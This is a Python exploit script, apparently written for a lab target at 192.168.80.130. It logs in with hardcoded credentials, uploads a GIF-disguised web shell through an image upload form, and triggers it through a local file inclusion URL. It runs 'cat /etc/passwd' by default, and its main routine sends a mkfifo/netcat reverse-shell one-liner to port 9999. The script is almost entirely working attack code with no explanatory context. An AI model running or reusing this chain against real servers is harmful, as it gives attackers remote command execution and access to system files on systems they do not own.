import requests
import urllib.parse

USERNAME = 'user1'
PASSWORD = '123456'
FILE = 'crafted_ex.gif'
LOGIN_URL = 'http://192.168.80.130/login.php'
UPLOAD_URL = 'http://192.168.80.130/process-image.php'
LFI_URL = 'http://192.168.80.130/index.php?action=uploads/'


def create_session():
    return requests.Session()


def login(session, url='', username='', password=''):
    data = {
        'username': f'{username}',
        'password': f'{password}'
    }
    response = session.post(url=f'{url}', data=data)

    if response.status_code == 200 and response.content.decode().find('Hello, you are logged in as user') != -1:
        print('\n[+] Logged in successfully\n')
    else:
        print('[-] Failed to log in\n')
        exit()


def upload_web_shell(session, url='', file=''):
    file = {'file': open(f'{file}', 'rb')}
    response = session.post(url=f'{url}', files=file)

    if response.status_code == 200 and response.content.decode().find('Image uploaded') != -1:
        print('[+] Web shell uploaded successfully\n')
    else:
        print('[-] Failed to upload the web shell\n')
        exit()


def execute_web_shell(session, url='', username='', cmd='cat /etc/passwd'):
    print(f'[i] Executing "{cmd}" command\n')
    response = session.get(f'{url}{username}.gif&cmd={cmd}')

    if response.status_code == 200:
        print('[+] Command executed successfully\n')

        # Extract the command's output
        html_output = response.content
        start_delim = b'GIF87a\x90\x01\x90\x01\xf7\x00\x00\x00\x00\x00\x00\x009\x00'
        start_index = html_output.index(start_delim) + len(start_delim)
        tmp_output = html_output[start_index:]

        end_delim = b'\n\x00A\x00\x001\x00\x00\x08\x00\x00)\x00\x00 \x00\x00\x18\x00\x00\x10\x00\x00J )'
        end_index = tmp_output.index(end_delim)
        output = tmp_output[:end_index]
        print(output.decode() + '\n')


if __name__ == '__main__':
    session = create_session()
    login(session, LOGIN_URL, USERNAME, PASSWORD)
    upload_web_shell(session, UPLOAD_URL, FILE)
    execute_web_shell(session, LFI_URL, USERNAME, cmd=urllib.parse.quote('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1 | nc 192.168.80.130 9999 > /tmp/f'))
